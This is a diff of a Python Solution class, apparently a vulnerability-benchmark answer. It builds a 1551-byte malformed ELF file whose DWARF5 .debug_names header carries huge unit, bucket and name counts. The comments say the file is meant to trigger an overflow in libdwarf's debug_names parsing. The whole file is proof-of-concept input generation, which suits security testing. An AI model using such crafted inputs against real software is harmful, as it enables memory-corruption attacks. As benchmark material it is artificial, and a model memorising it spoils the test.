@@ -1,94 +1,167 @@
 import struct
 import os
-import tempfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal valid ELF header for x86-64
-        elf_header = bytearray(64)
+        # Create a minimal ELF header
+        elf_header = bytearray()
         
         # ELF magic
-        elf_header[0:4] = b'\x7fELF'
-        elf_header[4] = 2  # 64-bit
-        elf_header[5] = 1  # Little endian
-        elf_header[6] = 1  # ELF version
-        elf_header[7] = 0  # OS ABI
-        elf_header[16:18] = struct.pack('<H', 2)  # ET_EXEC
-        elf_header[18:20] = struct.pack('<H', 0x3e)  # x86-64
-        elf_header[20:24] = struct.pack('<I', 1)  # ELF version
-        elf_header[40:48] = struct.pack('<Q', 64)  # e_phoff (program header offset)
-        elf_header[48:50] = struct.pack('<H', 64)  # e_ehsize
-        elf_header[54:56] = struct.pack('<H', 56)  # e_phentsize
-        elf_header[56:58] = struct.pack('<H', 2)  # e_phnum
+        elf_header.extend(b'\x7fELF')
+        # 64-bit, little endian, version 1
+        elf_header.extend(b'\x02\x01\x01')
+        # OS ABI (System V), ABI version
+        elf_header.extend(b'\x00' * 9)
+        # ET_REL (Relocatable file)
+        elf_header.extend(struct.pack('<H', 1))
+        # EM_X86_64
+        elf_header.extend(struct.pack('<H', 62))
+        # Version 1
+        elf_header.extend(struct.pack('<I', 1))
+        # Entry point (0 for relocatable)
+        elf_header.extend(struct.pack('<Q', 0))
+        # Program header offset (0)
+        elf_header.extend(struct.pack('<Q', 0))
+        # Section header offset (will be filled later)
+        elf_header.extend(struct.pack('<Q', 0))
+        # Flags
+        elf_header.extend(struct.pack('<I', 0))
+        # ELF header size
+        elf_header.extend(struct.pack('<H', 64))
+        # Program header entry size (0)
+        elf_header.extend(struct.pack('<H', 0))
+        # Program header count (0)
+        elf_header.extend(struct.pack('<H', 0))
+        # Section header entry size
+        elf_header.extend(struct.pack('<H', 64))
+        # Section header count (will be filled later)
+        elf_header.extend(struct.pack('<H', 0))
+        # Section name string table index
+        elf_header.extend(struct.pack('<H', 0))
         
-        # Create program headers
-        phdrs = bytearray()
-        
-        # First PHDR: PT_LOAD for code
-        phdrs += struct.pack('<IIQQQQ', 1, 5, 0, 0x400000, 0x400000, 0x1000)
-        
-        # Second PHDR: PT_LOAD for data (where debug sections go)
-        phdrs += struct.pack('<IIQQQQ', 1, 6, 0x2000, 0x402000, 0x402000, 0x1000)
-        
-        # Create minimal .debug_names section that triggers the vulnerability
-        # Based on libdwarf issue: incorrect bounds checking in dwarf_debugnames.c
+        # Create .debug_names section
         debug_names = bytearray()
         
-        # Unit length (64-bit format)
-        debug_names += b'\xff\xff\xff\xff'  # Extended length indicator
-        debug_names += struct.pack('<Q', 0x7fffffff)  # Very large length
+        # DWARF5 .debug_names unit_length
+        # Use 64-bit format (0xffffffff)
+        debug_names.extend(struct.pack('<I', 0xffffffff))
+        # Actual length (will be filled later)
+        debug_names.extend(struct.pack('<Q', 0))
         
-        # Version
-        debug_names += struct.pack('<H', 5)  # DWARF5
-        
-        # Padding
-        debug_names += b'\x00\x00'
-        
-        # compilation_unit_count, local_type_unit_count, foreign_type_unit_count
-        debug_names += struct.pack('<III', 1, 0, 0)
-        
-        # bucket_count - large value that will cause overflow
-        debug_names += struct.pack('<I', 0x3fffffff)
-        
+        # version (DWARF5)
+        debug_names.extend(struct.pack('<H', 5))
+        # padding
+        debug_names.extend(struct.pack('<H', 0))
+        # comp_unit_count
+        debug_names.extend(struct.pack('<I', 0x80000000))
+        # local_type_unit_count
+        debug_names.extend(struct.pack('<I', 0))
+        # foreign_type_unit_count
+        debug_names.extend(struct.pack('<I', 0))
+        # bucket_count
+        debug_names.extend(struct.pack('<I', 0x20000000))
         # name_count
-        debug_names += struct.pack('<I', 1)
-        
-        # abbreviation_table_size
-        debug_names += struct.pack('<I', 100)
-        
+        debug_names.extend(struct.pack('<I', 0x20000000))
+        # abbrev_table_size
+        debug_names.extend(struct.pack('<I', 0x10000000))
         # augmentation_string_size
-        debug_names += struct.pack('<I', 0)
+        debug_names.extend(struct.pack('<I', 0))
         
-        # Buckets array - minimal data
-        debug_names += b'\x00' * 4
+        # Add some data to trigger the overflow
+        # The overflow occurs when calculating limits for reading
+        # Add malformed data that will cause miscalculation
+        debug_names.extend(b'A' * 1000)
         
-        # Hash values array - minimal data
-        debug_names += b'\x00' * 4
+        # Fill in the actual length
+        actual_length = len(debug_names) - 12  # Subtract the 12-byte length field
+        debug_names[4:12] = struct.pack('<Q', actual_length)
         
-        # Name table entries
-        # Single entry with offset that points beyond allocated buffer
-        debug_names += struct.pack('<I', 0xfffffffe)  # index
-        debug_names += struct.pack('<I', 0)  # offset
+        # Create string table
+        strtab = bytearray()
+        strtab.extend(b'\x00')
+        strtab.extend(b'.debug_names\x00')
+        strtab.extend(b'.shstrtab\x00')
         
-        # Abbreviation table - minimal valid content
-        debug_names += b'\x01'  # Entry code
-        debug_names += b'test\x00'  # Tag name
-        debug_names += b'\x00'  # Null terminator for table
+        # Create section headers
+        sections = []
         
-        # Pad to trigger overflow when reading
-        remaining = 1551 - len(elf_header) - len(phdrs) - len(debug_names)
-        if remaining > 0:
-            debug_names += b'A' * remaining
+        # NULL section
+        null_section = bytearray(64)
+        sections.append(null_section)
         
-        # Construct final ELF
-        elf = elf_header + phdrs
+        # .debug_names section header
+        debug_names_shdr = bytearray()
+        # sh_name
+        debug_names_shdr.extend(struct.pack('<I', 1))  # Offset in .shstrtab
+        # sh_type (SHT_PROGBITS)
+        debug_names_shdr.extend(struct.pack('<I', 1))
+        # sh_flags (SHF_ALLOC)
+        debug_names_shdr.extend(struct.pack('<Q', 2))
+        # sh_addr
+        debug_names_shdr.extend(struct.pack('<Q', 0))
+        # sh_offset (will be filled later)
+        debug_names_shdr.extend(struct.pack('<Q', 0))
+        # sh_size
+        debug_names_shdr.extend(struct.pack('<Q', len(debug_names)))
+        # sh_link
+        debug_names_shdr.extend(struct.pack('<I', 0))
+        # sh_info
+        debug_names_shdr.extend(struct.pack('<I', 0))
+        # sh_addralign
+        debug_names_shdr.extend(struct.pack('<Q', 1))
+        # sh_entsize
+        debug_names_shdr.extend(struct.pack('<Q', 0))
+        sections.append(debug_names_shdr)
         
-        # Add padding to align debug_names section
-        current_len = len(elf)
-        pad_len = (0x2000 - current_len) % 0x1000
-        elf += b'\x00' * pad_len
+        # .shstrtab section header
+        shstrtab_shdr = bytearray()
+        # sh_name
+        shstrtab_shdr.extend(struct.pack('<I', 13))  # Offset in .shstrtab
+        # sh_type (SHT_STRTAB)
+        shstrtab_shdr.extend(struct.pack('<I', 3))
+        # sh_flags (0)
+        shstrtab_shdr.extend(struct.pack('<Q', 0))
+        # sh_addr
+        shstrtab_shdr.extend(struct.pack('<Q', 0))
+        # sh_offset (will be filled later)
+        shstrtab_shdr.extend(struct.pack('<Q', 0))
+        # sh_size
+        shstrtab_shdr.extend(struct.pack('<Q', len(strtab)))
+        # sh_link
+        shstrtab_shdr.extend(struct.pack('<I', 0))
+        # sh_info
+        shstrtab_shdr.extend(struct.pack('<I', 0))
+        # sh_addralign
+        shstrtab_shdr.extend(struct.pack('<Q', 1))
+        # sh_entsize
+        shstrtab_shdr.extend(struct.pack('<Q', 0))
+        sections.append(shstrtab_shdr)
         
-        # Add debug_names at offset 0x2000
-        elf += debug_names
+        # Calculate offsets
+        debug_names_offset = len(elf_header)
+        strtab_offset = debug_names_offset + len(debug_names)
+        shdr_offset = strtab_offset + len(strtab)
         
-        return bytes(elf[:1551])
+        # Update ELF header
+        elf_header[40:48] = struct.pack('<Q', shdr_offset)  # e_shoff
+        elf_header[60:62] = struct.pack('<H', 3)  # e_shnum
+        elf_header[62:64] = struct.pack('<H', 2)  # e_shstrndx
+        
+        # Update section headers
+        debug_names_shdr[24:32] = struct.pack('<Q', debug_names_offset)
+        shstrtab_shdr[24:32] = struct.pack('<Q', strtab_offset)
+        
+        # Assemble final file
+        poc = bytearray()
+        poc.extend(elf_header)
+        poc.extend(debug_names)
+        poc.extend(strtab)
+        poc.extend(b''.join(sections))
+        
+        # Ensure we reach the target length
+        if len(poc) < 1551:
+            poc.extend(b'X' * (1551 - len(poc)))
+        elif len(poc) > 1551:
+            poc = poc[:1551]
+        
+        return bytes(poc)
